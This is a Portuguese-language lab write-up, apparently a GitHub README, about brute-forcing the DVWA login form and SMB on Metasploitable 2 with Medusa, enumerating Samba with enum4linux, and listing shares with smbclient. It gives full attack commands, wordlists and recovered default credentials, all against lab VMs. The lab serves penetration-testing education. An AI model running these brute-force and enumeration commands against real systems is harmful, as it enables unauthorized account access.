# Simulando Ataque de força bruta com Medusa e Kali Linux
Este projeto demonstra um ataque de força bruta com a ferrameta medusa contra o formulário de login do DVWA, além de enumeração de serviço SAMBA.

## Cenário utilizado
-Kali Linux (Virtualbox)

-Metasploitable 2 (Virtualbox)

-DVWA(Damn Vunerable Web App) Configurado em security =Low

-Medusa v2.3

_enum4linux v0.9.1

Comunicação entre as VMs via rede Host-Only.

### Endereço IP do Laboratório
**Kali Linux:** (automático)
**Metasploitable:** ´192.168.56.102`

Comando utilizado para identificar conectividade: ping -c 4 192.168.56.102

# (1)Ataque de Força Bruta em Formulário Web(DVWA)
## Preparação para listas de usuários e senhas
Usuários: 
echo -e "user\nmsfadmin\nadmin\nroot" > users.

Senhas:
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

## Execução do Ataque com Medusa
A ferramenta Medusa foi executada duas vezes. Na **primeira tentativa**, o comando e retornou um *falso positivo*, indicando credenciais que não funcionaram no login real do DVWA.
Após ajustar os parâmetros, uma **segunda execução** foi realizada, desta vez retornando credencias válidas e confirmadas manualmente.





## Comando utilizado
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \ -m PAGE:'/dvwa/login.php\' -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \-m'Fail=loginfailed' -t 6
## Resultado
A segunda Tentativa encontrou credenciais realmente válidas:
**usuário** 'admin'
**senha** 'password'.
Essas credenciais foram testadas diretamente no DVWA e **acessaram o painel com sucesso**, confirmando o brute force correto.



<img width="800" height="600" alt="image" src="https://github.com/user-attachments/assets/c3fbf822-4fc4-425f-afd9-4822254cfd5b" /><img width="800" height="600" alt="image" src="https://github.com/user-attachments/assets/867bb33d-549e-4696-9bc2-fc5d774fac23" /><img width="800" height="600" alt="image" src="https://github.com/user-attachments/assets/fc3e0e4f-36e5-4587-ad69-438504ff53da" /><img width="800" height="600" alt="image" src="https://github.com/user-attachments/assets/22b1805e-1b3a-4e45-8e52-f110a8d491c3" />


# (2) Enumeração Samba com enum4linux
Comando utilizado: 
enum4linux -a 192.168.56.102 | tee enum4_output.txt

### Informações descobertas:
-Usuários identificados:

-'administrator'

-'guest'

-'krbtgt'

-'domain admins'

-'root'

-'bin'

-'none'

Nome do workgroup :
**WORKGROUP**

# (3) Ataque Password Sprying no SMB

## Arquivos utilizados 
Lista de usuários para smb:
echo -e 'user\nmsfadmin\nservice' > smb_users.txt

Lista de senhas para spraying:
echo -e 'password\n123456\nwelcome123\nmsfadmin' > senhas_spray.txt
 
## Execução do Brute Force no Samba com Medusa
Comando:
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt \ -M smbnt -t 2 -T 50


<img width="800" height="600" alt="image" src="https://github.com/user-attachments/assets/595acfea-2a5a-48be-9320-f2cc5454e979" />



### Resultado do ataque SMB
Credencial válida encontrada:

**Usuário:** 'msfadmin'
**senha:** 'msfadmin'


<img width="800" height="600" alt="image" src="https://github.com/user-attachments/assets/56d1a5f6-9432-43cb-8fe5-6d893a1a4b7c" />


# Acesso ao SMB com credencias válidas 
Após o brute force bem-sucedido, foi possível listar shares:
smbclient -L // 192.168.56.102 -U msfadmin

### Shares encontradas:

-'Print$'

-'tmp'

-'opt'

-'ipc$'

-'Admin$'

-'msfadmin'(Home Directory)

<img width="800" height="600" alt="image" src="https://github.com/user-attachments/assets/29260e32-f6b7-4f69-a0d0-e463b2cd6f9e" />


# Conclusão
Este Laboratório demonstrou:

_ O uso correto da ferramenta **Medusa** para brute force em DVWA e SMB.

_ Como gerar wordlist e senhas.

_ Como realizar **enumeração Samba** com enum4linux.

_ Como validar credenciais com smbclient.

Este projeto replica cenários comuns de pentest para aprendizado e documentação profissional.

# Autor(a):

Laboratório realizado por **Adailde Fernanda**, utilizando Kali Linux e Metasploitable 2.


